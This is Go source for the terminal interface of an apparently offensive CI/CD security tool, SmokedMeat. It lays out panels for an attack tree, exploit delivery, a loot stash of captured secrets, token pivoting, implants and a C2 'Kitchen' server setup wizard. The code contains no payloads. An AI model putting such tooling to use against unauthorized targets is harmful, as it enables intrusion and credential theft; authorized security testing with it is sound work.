// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"fmt"
	"image"
	"strings"
	"time"

	"charm.land/lipgloss/v2"
	uv "github.com/charmbracelet/ultraviolet"
	"github.com/charmbracelet/ultraviolet/layout"

	"github.com/boostsecurityio/smokedmeat/internal/buildinfo"
	"github.com/boostsecurityio/smokedmeat/internal/cachepoison"
)

const (
	fixedHeaderHeight      = 1
	fixedInputHeight       = 3
	fixedStatusHeight      = 1
	defaultActivityHeight  = 4
	expandedActivityHeight = 8
	fixedChromeHeight      = fixedHeaderHeight + fixedInputHeight + fixedStatusHeight
	fixedOverhead          = fixedChromeHeight + defaultActivityHeight
	narrowThreshold        = 80
)

type StickersLayout struct {
	width          int
	height         int
	activityHeight int
}

func NewStickersLayout() *StickersLayout {
	return &StickersLayout{}
}

func (sl *StickersLayout) Resize(w, h int) {
	sl.width = w
	sl.height = h
}

func (sl *StickersLayout) SetActivityHeight(h int) {
	if h < defaultActivityHeight {
		h = defaultActivityHeight
	}
	sl.activityHeight = h
}

func (sl *StickersLayout) ActivityHeight() int {
	if sl.activityHeight < defaultActivityHeight {
		return defaultActivityHeight
	}
	return sl.activityHeight
}

func (sl *StickersLayout) FlexHeight() int {
	h := sl.height - fixedChromeHeight - sl.ActivityHeight()
	if h < 4 {
		return 4
	}
	return h
}

func (sl *StickersLayout) IsNarrow() bool {
	return sl.width < narrowThreshold
}

type ContentRenderers struct {
	Tree     func(width, height int) string
	Menu     func(width, height int) string
	Loot     func(width, height int) string
	Activity func(width, height int, focused bool) string
	Agent    func(width, height int) string
	HasLoot  bool
}

func (sl *StickersLayout) renderIdleContent(renderers ContentRenderers, flexH int) string {
	if sl.IsNarrow() {
		return sl.renderNarrowContent(renderers, flexH)
	}
	return sl.renderTwoColumnContent(renderers, flexH)
}

func (sl *StickersLayout) renderTwoColumnContent(renderers ContentRenderers, flexH int) string {
	area := image.Rect(0, 0, sl.width, flexH)
	leftArea, rightArea := layout.SplitHorizontal(area, layout.Percent(50))

	treeWidth := leftArea.Dx() - 1
	leftContent := appendSeparatorColumn(renderers.Tree(treeWidth, leftArea.Dy()), treeWidth, leftArea.Dy())
	rightContent := sl.renderStackedPanels(rightArea.Dx(), rightArea.Dy(), renderers)

	scr := uv.NewScreenBuffer(sl.width, flexH)
	uv.NewStyledString(leftContent).Draw(scr, leftArea)
	uv.NewStyledString(rightContent).Draw(scr, rightArea)
	return renderBufferPadded(scr, sl.width, flexH)
}

func appendSeparatorColumn(content string, width, height int) string {
	lines := strings.Split(content, "\n")
	for len(lines) < height {
		lines = append(lines, "")
	}
	result := make([]string, len(lines))
	for i, line := range lines {
		result[i] = padRight(line, width) + mutedColor.Render("│")
	}
	return strings.Join(result, "\n")
}

func (sl *StickersLayout) renderNarrowContent(renderers ContentRenderers, flexH int) string {
	content := renderers.Tree(sl.width, flexH)
	return renderStringPadded(content, sl.width, flexH)
}

func (sl *StickersLayout) renderStackedPanels(width, height int, renderers ContentRenderers) string {
	contentArea := image.Rect(0, 0, width, max(height-1, 1))
	var menuArea, lootArea image.Rectangle
	if renderers.HasLoot {
		menuArea, lootArea = layout.SplitVertical(contentArea, layout.Percent(55))
	} else {
		menuArea, lootArea = layout.SplitVertical(contentArea, layout.Fixed(max(contentArea.Dy()-3, 1)))
	}

	menu := renderers.Menu(menuArea.Dx(), menuArea.Dy())
	separator := mutedColor.Render(strings.Repeat("─", width))
	loot := renderers.Loot(lootArea.Dx(), lootArea.Dy())

	return menu + "\n" + separator + "\n" + loot
}

func (sl *StickersLayout) renderAgentContent(renderers ContentRenderers, flexH int) string {
	if sl.IsNarrow() {
		return sl.renderNarrowContent(renderers, flexH)
	}

	area := image.Rect(0, 0, sl.width, flexH)
	leftArea, rightArea := layout.SplitHorizontal(area, layout.Percent(50))

	treeWidth := leftArea.Dx() - 1
	leftContent := appendSeparatorColumn(renderers.Tree(treeWidth, leftArea.Dy()), treeWidth, leftArea.Dy())
	rightContent := sl.renderAgentStack(rightArea.Dx(), rightArea.Dy(), renderers)

	scr := uv.NewScreenBuffer(sl.width, flexH)
	uv.NewStyledString(leftContent).Draw(scr, leftArea)
	uv.NewStyledString(rightContent).Draw(scr, rightArea)
	return renderBufferPadded(scr, sl.width, flexH)
}

func (sl *StickersLayout) renderAgentStack(width, height int, renderers ContentRenderers) string {
	contentArea := image.Rect(0, 0, width, max(height-2, 1))
	agentArea, remainingArea := layout.SplitVertical(contentArea, layout.Fixed(min(4, contentArea.Dy())))
	menuArea, lootArea := layout.SplitVertical(remainingArea, layout.Percent(45))
	sep := mutedColor.Render(strings.Repeat("─", width))
	agent := renderers.Agent(agentArea.Dx(), agentArea.Dy())
	menu := renderers.Menu(menuArea.Dx(), menuArea.Dy())
	loot := renderers.Loot(lootArea.Dx(), lootArea.Dy())

	return agent + "\n" + sep + "\n" + menu + "\n" + sep + "\n" + loot
}

func (sl *StickersLayout) RenderContent(renderers ContentRenderers, activityFocused bool) string {
	return sl.renderIdleContent(renderers, sl.FlexHeight())
}

func (sl *StickersLayout) RenderContentWithActivity(renderers ContentRenderers, activityFocused bool) string {
	content := sl.RenderContent(renderers, activityFocused)
	activity := sl.renderActivityRegion(renderers, activityFocused)
	return content + "\n" + activity
}

func (sl *StickersLayout) renderActivityRegion(renderers ContentRenderers, activityFocused bool) string {
	sep := mutedColor.Render(strings.Repeat("─", sl.width))
	logLines := sl.ActivityHeight() - 1
	if logLines < 1 {
		logLines = 1
	}
	content := renderers.Activity(sl.width, logLines, activityFocused)
	return sep + "\n" + content
}

func (sl *StickersLayout) RenderIdle(header, input, status string, hintActive bool, renderers ContentRenderers, activityFocused bool) string {
	flexH := sl.FlexHeight()
	if hintActive {
		flexH--
	}

	content := sl.renderIdleContent(renderers, flexH)
	activity := sl.renderActivityRegion(renderers, activityFocused)

	return lipgloss.JoinVertical(lipgloss.Left,
		header,
		content,
		activity,
		input,
		status,
	)
}

func (sl *StickersLayout) RenderAgent(header, input, status string, hintActive bool, renderers ContentRenderers, activityFocused bool) string {
	flexH := sl.FlexHeight()
	if hintActive {
		flexH--
	}

	content := sl.renderAgentContent(renderers, flexH)
	activity := sl.renderActivityRegion(renderers, activityFocused)

	return lipgloss.JoinVertical(lipgloss.Left,
		header,
		content,
		activity,
		input,
		status,
	)
}

func (m *Model) RenderStickersLayout() string {
	if m.quitting {
		return "Goodbye!\n"
	}
	if !m.ready {
		return ""
	}

	header := m.renderNewHeader()
	input := m.renderInputPanel()
	status := m.renderNewStatusBar()

	activityFocused := m.paneFocus == PaneFocusActivity && !m.view.IsModal() && m.focus != FocusInput
	activityHeight := m.activityRegionHeight()
	m.stickersLayout.SetActivityHeight(activityHeight)

	renderers := ContentRenderers{
		Tree: func(w, h int) string {
			return m.RenderAttackTree(w, h)
		},
		Menu: func(w, h int) string {
			return m.RenderSuggestions(w, h)
		},
		Loot: func(w, h int) string {
			return m.RenderLootStash(w, h)
		},
		Activity: func(w, h int, focused bool) string {
			return m.activityLog.Render(w, h, focused)
		},
		Agent: func(w, h int) string {
			return m.RenderAgentPanel(w, h)
		},
		HasLoot: len(m.lootStash) > 0 || len(m.sessionLoot) > 0,
	}

	flexHeight := m.stickersLayout.FlexHeight()
	hintActive := m.completionHint != "" && !m.view.IsModal()

	var screen string
	switch m.view {
	case ViewSetupWizard:
		content := m.renderSetupWizardView(flexHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, content, status)
	case ViewWaiting:
		contentHeight := flexHeight + fixedInputHeight
		content := m.renderWaitingView(contentHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, content, status)
	case ViewWizard:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderWizardOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewLicense:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderLicenseOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewHelp:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderHelpOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewReAuth:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderReAuthOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewKillChain:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderKillChainOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewTheme:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderThemeOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewOmnibox:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderOmniboxOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewCallbacks:
		background := m.stickersLayout.RenderContentWithActivity(renderers, activityFocused)
		overlayStr := m.renderCallbacksOverlay(background, flexHeight+activityHeight)
		screen = lipgloss.JoinVertical(lipgloss.Left, header, overlayStr, input, status)
	case ViewAgent:
		screen = m.stickersLayout.RenderAgent(header, input, status, hintActive, renderers, activityFocused)
	default:
		screen = m.stickersLayout.RenderIdle(header, input, status, hintActive, renderers, activityFocused)
	}

	if m.flashMessage != "" && time.Now().Before(m.flashUntil) {
		screen = m.renderToastOverlay(screen)
	}

	return screen
}

func (m *Model) renderThemeOverlay(background string, height int) string {
	modalWidth := 42
	if m.width < 50 {
		modalWidth = m.width - 8
	}
	modalHeight := 10
	if height < 14 {
		modalHeight = height - 4
	}

	modalLines := m.buildThemeModal(modalWidth, modalHeight)
	modal := strings.Join(modalLines, "\n")
	return compositeCenter(modal, dimBackground(background), m.width, height)
}

func (m *Model) buildThemeModal(width, height int) []string {
	var lines []string

	bTop := modalBorderStyle.Render("┌" + strings.Repeat("─", width-2) + "┐")
	bLeft := modalBorderStyle.Render("│")
	bRight := modalBorderStyle.Render("│")
	bBottom := modalBorderStyle.Render("└" + strings.Repeat("─", width-2) + "┘")

	lines = append(lines, bTop)

	title := " THEME"
	innerWidth := width - 2
	titleContent := title + strings.Repeat(" ", innerWidth-len(title))
	styledTitle := modalTitleStyle.Width(innerWidth).Render(titleContent)
	lines = append(lines,
		bLeft+styledTitle+bRight,
		bLeft+strings.Repeat(" ", innerWidth)+bRight,
	)

	names := ThemeNames()
	for i, name := range names {
		if len(lines) >= height-3 {
			break
		}
		marker := "○"
		style := mutedColor
		if i == m.themeCursor {
			marker = "●"
			style = secondaryColorStyle
		}
		label := ThemeLabel(name)
		desc := themeDescription(name)
		content := fmt.Sprintf("  %s %s", marker, label)
		styledContent := style.Render(content)
		descRendered := mutedColor.Render("  " + desc)
		contentWidth := lipgloss.Width(styledContent) + lipgloss.Width(descRendered)
		padding := innerWidth - contentWidth
		if padding < 0 {
			padding = 0
		}
		lines = append(lines, bLeft+styledContent+descRendered+strings.Repeat(" ", padding)+bRight)
	}

	for len(lines) < height-3 {
		lines = append(lines, bLeft+strings.Repeat(" ", innerWidth)+bRight)
	}

	hints := helpKeyStyle.Render("j/k") + helpDescStyle.Render(":select ") +
		helpKeyStyle.Render("Enter") + helpDescStyle.Render(":apply ") +
		helpKeyStyle.Render("Esc") + helpDescStyle.Render(":cancel")
	bSep := modalBorderStyle.Render("─")
	hintsWidth := lipgloss.Width(hints)
	hintsPadding := innerWidth - 2 - hintsWidth
	if hintsPadding < 0 {
		hintsPadding = 0
	}
	lines = append(lines,
		bLeft+" "+strings.Repeat(bSep, innerWidth-2)+" "+bRight,
		bLeft+" "+hints+strings.Repeat(" ", hintsPadding)+" "+bRight,
		bBottom,
	)

	return lines
}

func (m *Model) renderToastOverlay(screen string) string {
	msg := " ✓ " + m.flashMessage + " "
	toastStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(successColorVal).
		Foreground(successColorVal).
		Bold(true).
		Padding(0, 1)
	toast := toastStyle.Render(msg)
	return compositeTopCenter(toast, screen, m.width, m.height, 2)
}

func padRight(s string, width int) string {
	visibleWidth := lipgloss.Width(s)
	if visibleWidth >= width {
		return s
	}
	return s + strings.Repeat(" ", width-visibleWidth)
}

func renderBufferPadded(scr uv.ScreenBuffer, width, height int) string {
	rendered := scr.Render()
	return renderStringPadded(rendered, width, height)
}

func renderStringPadded(s string, width, height int) string {
	lines := strings.Split(s, "\n")
	for len(lines) < height {
		lines = append(lines, "")
	}
	if len(lines) > height {
		lines = lines[:height]
	}
	for i, line := range lines {
		lines[i] = padRight(line, width)
	}
	return strings.Join(lines, "\n")
}

func compositeCenter(foreground, background string, bgWidth, bgHeight int) string {
	scr := uv.NewScreenBuffer(bgWidth, bgHeight)
	uv.NewStyledString(background).Draw(scr, scr.Bounds())
	fgW, fgH := lipgloss.Size(foreground)
	rect := layout.CenterRect(scr.Bounds(), fgW, fgH)
	uv.NewStyledString(foreground).Draw(scr, rect)
	return renderBufferPadded(scr, bgWidth, bgHeight)
}

func compositeTopCenter(foreground, background string, bgWidth, bgHeight, yOffset int) string {
	scr := uv.NewScreenBuffer(bgWidth, bgHeight)
	uv.NewStyledString(background).Draw(scr, scr.Bounds())
	fgW, fgH := lipgloss.Size(foreground)
	rect := layout.TopCenterRect(scr.Bounds(), fgW, fgH)
	rect = rect.Add(image.Pt(0, yOffset))
	uv.NewStyledString(foreground).Draw(scr, rect)
	return renderBufferPadded(scr, bgWidth, bgHeight)
}

func dimBackground(background string) string {
	bgLines := strings.Split(background, "\n")
	dimmed := make([]string, len(bgLines))
	for i, line := range bgLines {
		dimmed[i] = mutedColor.Render(stripANSI(line))
	}
	return strings.Join(dimmed, "\n")
}

func formatWaitingDuration(d time.Duration) string {
	m := int(d.Minutes())
	s := int(d.Seconds()) % 60
	return fmt.Sprintf("%d:%02d", m, s)
}

func waitingETA(method string) time.Duration {
	switch method {
	case "Create PR":
		return 45 * time.Second
	default:
		return 30 * time.Second
	}
}

func (m *Model) renderNewHeader() string {
	title := titleStyle.Render(" 🥩 SmokedMeat Counter ")

	phaseStyle := mutedColor
	if m.phase == PhasePostExploit || m.phase == PhasePivot {
		phaseStyle = warningColor
	}
	phaseIndicator := phaseStyle.Render("Phase:") + successColor.Render(m.phase.String())

	var rightParts []string

	if m.phase.HasActiveAgent() && m.activeAgent != nil {
		remaining := time.Until(m.jobDeadline)
		if remaining <= 0 || m.jobDeadline.IsZero() {
			if m.dwellMode {
				rightParts = append(rightParts, mutedColor.Render("✓ Dwell complete"))
			} else {
				rightParts = append(rightParts, mutedColor.Render("✓ Express complete"))
			}
		} else {
			rightParts = append(rightParts, warningColor.Render("⏱ "+formatCountdown(remaining)))
		}
	}

	if m.config.Operator != "" {
		rightParts = append(rightParts, mutedColor.Render("@"+m.config.Operator))
	}

	if m.connected {
		rightParts = append(rightParts, successColor.Render("●"))
	} else {
		rightParts = append(rightParts, errorColor.Render("○"))
	}

	rightPart := strings.Join(rightParts, " ")

	leftWidth := lipgloss.Width(title)
	centerWidth := lipgloss.Width(phaseIndicator)
	rightWidth := lipgloss.Width(rightPart)

	centerStart := (m.width - centerWidth) / 2
	leftSpacing := centerStart - leftWidth
	rightSpacing := m.width - centerStart - centerWidth - rightWidth

	if leftSpacing < 1 {
		leftSpacing = 1
	}
	if rightSpacing < 1 {
		rightSpacing = 1
	}

	headerLine := title + strings.Repeat(" ", leftSpacing) + phaseIndicator + strings.Repeat(" ", rightSpacing) + rightPart
	return headerBarStyle.Width(m.width).Render(headerLine)
}

func (m *Model) renderNewStatusBar() string {
	var items []string

	if m.tokenInfo != nil {
		tokenParts := []string{
			successColor.Render("🥸"),
			successColor.Render(m.tokenInfo.MaskedValue()),
		}
		if m.tokenInfo.Owner != "" {
			tokenParts = append(tokenParts, successColor.Render("@"+m.tokenInfo.Owner))
		}
		if m.initialTokenInfo != nil && m.tokenInfo.Value != m.initialTokenInfo.Value {
			tokenParts = append(tokenParts, mutedColor.Render("(pivoted)"))
		}
		items = append(items, strings.Join(tokenParts, " "))
	}
	if target := m.currentTargetSpec(); target != "" {
		items = append(items, secondaryColorStyle.Render("🎯 "+target))
	}

	leftContent := strings.Join(items, "  ")

	if m.view == ViewFindings || m.view == ViewAgent {
		contextHints := m.contextStatusHints()
		leftSpacing := 2
		globalHints := m.globalStatusHintsForWidth(m.width - lipgloss.Width(leftContent) - leftSpacing - lipgloss.Width(contextHints))
		if lipgloss.Width(leftContent)+leftSpacing+lipgloss.Width(contextHints)+lipgloss.Width(globalHints) > m.width {
			contextHints = ""
		}
		leftSpacing = 1
		if contextHints != "" {
			leftSpacing = 2
		}
		globalHints = m.globalStatusHintsForWidth(m.width - lipgloss.Width(leftContent) - leftSpacing - lipgloss.Width(contextHints))
		rightSpacing := m.width - lipgloss.Width(leftContent) - leftSpacing - lipgloss.Width(contextHints) - lipgloss.Width(globalHints)
		if rightSpacing < 1 {
			rightSpacing = 1
		}
		statusLine := leftContent + strings.Repeat(" ", leftSpacing)
		if contextHints != "" {
			statusLine += contextHints
		}
		statusLine += strings.Repeat(" ", rightSpacing) + globalHints
		return statusBarStyle.Width(m.width).Render(statusLine)
	}

	var keyHints string
	switch m.view {
	case ViewSetupWizard:
		keyHints = helpKeyStyle.Render("Esc") + helpDescStyle.Render(":quit ")
		switch {
		case m.setupWizard != nil && m.setupWizard.Connecting:
			// No hints while auto-retrying
		case m.setupWizard != nil && m.setupWizard.AnalysisRetryPending:
			keyHints += mutedColor.Render("retrying...")
		case m.setupWizard != nil && m.setupWizard.AnalysisRunning:
			keyHints += mutedColor.Render("analyzing...")
		case m.setupWizard != nil && m.setupWizard.Step == 7 && m.setupWizard.AnalysisSummary != "":
			keyHints += helpKeyStyle.Render("Enter") + helpDescStyle.Render(":continue ")
			keyHints += helpKeyStyle.Render("r") + helpDescStyle.Render(":re-analyze ")
			if m.setupWizard.CanGoBack() {
				keyHints += helpKeyStyle.Render("Tab") + helpDescStyle.Render(":back")
			}
		case m.setupWizard != nil && m.setupWizard.Error != "" && (m.setupWizard.Step == 4 || m.setupWizard.Step == 7):
			keyHints += helpKeyStyle.Render("r") + helpDescStyle.Render(":retry ")
			if m.setupWizard.CanGoBack() {
				keyHints += helpKeyStyle.Render("Tab") + helpDescStyle.Render(":back")
			}
		default:
			if m.setupWizard != nil && m.setupWizard.CanGoBack() {
				keyHints += helpKeyStyle.Render("Tab") + helpDescStyle.Render(":back ")
			}
			sw := m.setupWizard
			if sw != nil {
				hasRadio := (sw.Step >= 2 && sw.Step <= 4) ||
					(sw.Step == 5 && sw.TokenSubStep == setupTokenSubStepChoice) ||
					(sw.Step == 6 && sw.TargetSubStep == 0)
				if hasRadio {
					keyHints += helpKeyStyle.Render("↑↓/jk") + helpDescStyle.Render(":select ") +
						helpKeyStyle.Render("Enter") + helpDescStyle.Render(":confirm")
				} else {
					keyHints += helpKeyStyle.Render("Enter") + helpDescStyle.Render(":continue")
				}
			}
		}
	case ViewWizard:
		if m.wizard != nil {
			switch m.wizard.Step {
			case 1:
				keyHints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(":continue ") +
					helpKeyStyle.Render("Esc") + helpDescStyle.Render(":cancel")
			case 2:
				optCount := len(ApplicableDeliveryMethods(m.wizard.SelectedVuln))
				keyHints = helpKeyStyle.Render(fmt.Sprintf("1-%d", optCount)) + helpDescStyle.Render(":select ") +
					helpKeyStyle.Render("Enter") + helpDescStyle.Render(":confirm ") +
					helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
			case 3:
				action := ":deploy "
				switch m.wizard.DeliveryMethod {
				case DeliveryCopyOnly, DeliveryManualSteps:
					action = ":copy "
				}
				keyHints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(action) +
					helpKeyStyle.Render("Esc") + helpDescStyle.Render(":back")
			}
		}
	case ViewLicense:
		keyHints = helpKeyStyle.Render("Esc") + helpDescStyle.Render(":close ") +
			helpKeyStyle.Render("Enter") + helpDescStyle.Render(":close")
	case ViewHelp:
		keyHints = helpKeyStyle.Render("Esc") + helpDescStyle.Render(":close ") +
			helpKeyStyle.Render("?") + helpDescStyle.Render(":close")
	case ViewReAuth:
		keyHints = helpKeyStyle.Render("Enter") + helpDescStyle.Render(":re-authenticate")
	case ViewTheme:
		keyHints = helpKeyStyle.Render("j/k") + helpDescStyle.Render(":select ") +
			helpKeyStyle.Render("Enter") + helpDescStyle.Render(":apply ") +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":cancel")
	case ViewOmnibox:
		keyHints = helpKeyStyle.Render("↑↓") + helpDescStyle.Render(":select ") +
			helpKeyStyle.Render("Enter") + helpDescStyle.Render(":jump ") +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":close")
	case ViewKillChain:
		keyHints = helpKeyStyle.Render("Esc/K") + helpDescStyle.Render(":close ") +
			helpKeyStyle.Render("j/k") + helpDescStyle.Render(":scroll")
	case ViewCallbacks:
		keyHints = helpKeyStyle.Render("j/k") + helpDescStyle.Render(":select ") +
			helpKeyStyle.Render("e/d/n/x/r") + helpDescStyle.Render(":manage ") +
			helpKeyStyle.Render("Esc") + helpDescStyle.Render(":close")
	case ViewWaiting:
		keyHints = helpKeyStyle.Render("Esc") + helpDescStyle.Render(":cancel ") +
			helpKeyStyle.Render("o") + helpDescStyle.Render(":open PR ") +
			helpKeyStyle.Render("g") + helpDescStyle.Render(":graph")
	case ViewAgent:
		keyHints = helpKeyStyle.Render("q") + helpDescStyle.Render(":quit ")
		keyHints += m.paneNavHints()
		if m.focus != FocusInput {
			keyHints += helpKeyStyle.Render("1-5") + helpDescStyle.Render(":action ") +
				helpKeyStyle.Render("g") + helpDescStyle.Render(":graph ") +
				helpKeyStyle.Render("r") + helpDescStyle.Render(":exit ")
		}
		keyHints += helpKeyStyle.Render("?") + helpDescStyle.Render(":help")
	default: // ViewFindings
		keyHints = helpKeyStyle.Render("q") + helpDescStyle.Render(":quit ")
		keyHints += m.paneNavHints()
		if m.focus != FocusInput {
			keyHints += helpKeyStyle.Render("1-5") + helpDescStyle.Render(":select ") +
				helpKeyStyle.Render("g") + helpDescStyle.Render(":graph ") +
				helpKeyStyle.Render("t") + helpDescStyle.Render(":theme ")
		}
		keyHints += helpKeyStyle.Render("?") + helpDescStyle.Render(":help")
	}

	leftWidth := lipgloss.Width(leftContent)
	rightWidth := lipgloss.Width(keyHints) + 10
	spacing := m.width - leftWidth - rightWidth
	if spacing < 1 {
		spacing = 1
	}

	return statusBarStyle.Width(m.width).Render(
		leftContent + strings.Repeat(" ", spacing) + keyHints,
	)
}

func (m *Model) globalStatusHints() string {
	return m.globalStatusHintsForWidth(-1)
}

func (m *Model) globalStatusHintsForWidth(maxWidth int) string {
	switch {
	case m.focus == FocusInput && m.input.Value() != "":
		return renderStatusHints(maxWidth, []statusHintSpec{
			{Key: "Esc", Desc: "clear"},
			{Key: "Tab", Desc: "complete"},
			{Key: "↑↓", Desc: "history"},
			{Key: "/", Desc: "jump"},
			{Key: "F1-F5", Desc: "pane"},
			{Key: "?", Desc: "help"},
		})
	case m.focus == FocusInput:
		return renderStatusHints(maxWidth, []statusHintSpec{
			{Key: "Esc", Desc: "cycle"},
			{Key: "Tab", Desc: "complete"},
			{Key: "↑↓", Desc: "history"},
			{Key: "/", Desc: "jump"},
			{Key: "F1-F5", Desc: "pane"},
			{Key: "?", Desc: "help"},
		})
	default:
		specs := []statusHintSpec{
			{Key: "q", Desc: "quit"},
			{Key: "Esc", Desc: "cycle"},
			{Key: "/", Desc: "jump"},
			{Key: "F1-F5", Desc: "pane"},
			{Key: "?", Desc: "help"},
		}
		if m.view == ViewFindings || m.view == ViewAgent {
			specs = append(specs,
				statusHintSpec{Key: "Shift+L", Desc: "log"},
				statusHintSpec{Key: "Shift+I", Desc: "implants"},
				statusHintSpec{Key: "t", Desc: "theme"},
			)
		}
		return renderStatusHints(maxWidth, specs)
	}
}

type statusHintSpec struct {
	Key  string
	Desc string
}

func renderStatusHints(maxWidth int, specs []statusHintSpec) string {
	if len(specs) == 0 {
		return ""
	}
	if maxWidth <= 0 {
		maxWidth = int(^uint(0) >> 1)
	}

	var parts []string
	used := 0
	for _, spec := range specs {
		part := helpKeyStyle.Render(spec.Key) + helpDescStyle.Render(":"+spec.Desc)
		nextWidth := used + lipgloss.Width(part)
		if len(parts) > 0 {
			nextWidth++
		}
		if nextWidth > maxWidth {
			continue
		}
		if len(parts) > 0 {
			used++
		}
		parts = append(parts, part)
		used += lipgloss.Width(part)
	}
	if len(parts) == 0 {
		return helpKeyStyle.Render(specs[0].Key) + helpDescStyle.Render(":"+specs[0].Desc)
	}
	return strings.Join(parts, " ")
}

func (m *Model) contextStatusHints() string {
	if m.focus == FocusInput {
		return ""
	}

	navHint := helpKeyStyle.Render("hjkl") + helpDescStyle.Render(":nav ")
	var hints string
	switch m.paneFocus {
	case PaneFocusFindings:
		hints += navHint
		if scopeType, _ := m.selectedDeepAnalyzeScope(); scopeType != "" {
			hints += helpKeyStyle.Render("d") + helpDescStyle.Render(":deep ")
		}
		if spec := m.selectedTreeTargetSpec(); spec != "" {
			hints += helpKeyStyle.Render("s") + helpDescStyle.Render(":target ")
		}
		if node := m.SelectedTreeNode(); node != nil && node.Type == TreeNodeVuln {
			if vulnerabilitySupportsExploit(m.vulnerabilityForNode(node)) {
				hints += helpKeyStyle.Render("x") + helpDescStyle.Render(":exploit ")
			}
			hints += helpKeyStyle.Render("K") + helpDescStyle.Render(":chain ")
		}
	case PaneFocusMenu:
		hints += navHint
		if m.menuCursor >= 0 && m.menuCursor < len(m.suggestions) {
			suggestion := m.suggestions[m.menuCursor]
			if suggestion.VulnIndex >= 0 && suggestion.VulnIndex < len(m.vulnerabilities) &&
				vulnerabilitySupportsExploit(&m.vulnerabilities[suggestion.VulnIndex]) {
				hints += helpKeyStyle.Render("Enter") + helpDescStyle.Render(":exploit ")
			} else {
				hints += helpKeyStyle.Render("Enter") + helpDescStyle.Render(":run ")
			}
		}
	case PaneFocusActivity:
		hints += navHint
	case PaneFocusLoot:
		if len(m.lootStash) > 0 || len(m.sessionLoot) > 0 {
			hints += navHint
			hints += helpKeyStyle.Render("e") + helpDescStyle.Render(":export ")
			if secret := m.SelectedLootSecret(); secret != nil {
				hints += helpKeyStyle.Render("c") + helpDescStyle.Render(":copy ")
				if secret.CanUseAsToken() {
					hints += helpKeyStyle.Render("v") + helpDescStyle.Render(":validate ")
				}
				if m.canPivotSecret(*secret) {
					hints += helpKeyStyle.Render("p") + helpDescStyle.Render(":pivot ")
				}
			}
		}
	}
	if m.tokenInfo != nil && m.initialTokenInfo != nil && m.tokenInfo.Value != m.initialTokenInfo.Value {
		hints += helpKeyStyle.Render("i") + helpDescStyle.Render(":initial ")
	}
	return hints
}

func (m *Model) paneNavHints() string {
	return m.contextStatusHints() + m.globalStatusHints()
}

func (m *Model) renderSetupWizardView(height int) string {
	sw := m.setupWizard
	if sw == nil {
		return ""
	}

	var lines []string

	boxWidth := 60
	if m.width < 70 {
		boxWidth = m.width - 10
	}
	leftPad := (m.width - boxWidth) / 2
	pad := strings.Repeat(" ", leftPad)

	lines = append(lines,
		"",
		centerText("SMOKEDMEAT SETUP", m.width),
		centerText(strings.Repeat("─", 16), m.width),
		"",
	)

	stepNames := []string{"Kitchen URL", "SSH Key", "Operator", "Deploy Key", "GitHub Token", "Target", "Analyze"}
	sep := mutedColor.Render(" → ")

	renderStepRange := func(from, to int) string {
		var parts []string
		for i := from; i < to; i++ {
			n := i + 1
			var dot, label string
			switch {
			case n < sw.Step:
				dot = successColor.Render("●")
				label = mutedColor.Render(stepNames[i])
			case n == sw.Step:
				dot = secondaryColorStyle.Render("●")
				label = secondaryColorStyle.Render(stepNames[i])
			default:
				dot = mutedColor.Render("○")
				label = mutedColor.Render(stepNames[i])
			}
			parts = append(parts, fmt.Sprintf("%s [%d] %s", dot, n, label))
		}
		return strings.Join(parts, sep)
	}

	lines = append(lines,
		centerText(renderStepRange(0, 4), m.width),
		centerText(renderStepRange(4, 7), m.width),
		"",
		pad+strings.Repeat("─", boxWidth),
	)

	switch sw.Step {
	case 1:
		lines = append(lines,
			pad+"  Step 1: Kitchen URL",
			pad+"",
			pad+"  Enter the URL of your Kitchen C2 server:",
			pad+"",
			pad+"  "+m.setupInput.View(),
			pad+"",
		)

	case 2:
		lines = append(lines,
			pad+"  Step 2: SSH Key",
			pad+"",
		)
		if len(sw.Keys) == 0 {
			lines = append(lines,
				pad+"  "+errorColor.Render("No SSH keys found in agent."),
				pad+"  "+mutedColor.Render("Run: ssh-add <path-to-key>"),
			)
		} else {
			lines = append(lines, pad+"  Select your SSH key:", pad+"")
			for i, k := range sw.Keys {
				marker := "○"
				style := mutedColor
				if i == sw.SelectedKey {
					marker = "●"
					style = secondaryColorStyle
				}
				lines = append(lines,
					pad+style.Render(fmt.Sprintf("  [%d] %s %s", i+1, marker, k.Comment)),
					pad+mutedColor.Render(fmt.Sprintf("      %s", k.Fingerprint)),
				)
			}
		}
		lines = append(lines, pad+"")

	case 3:
		lines = append(lines,
			pad+"  Step 3: Operator Name",
			pad+"",
		)

		genMarker := "○"
		genStyle := mutedColor
		if sw.OperatorNameChoice == OperatorNameGenerated {
			genMarker = "●"
			genStyle = secondaryColorStyle
		}
		lines = append(lines,
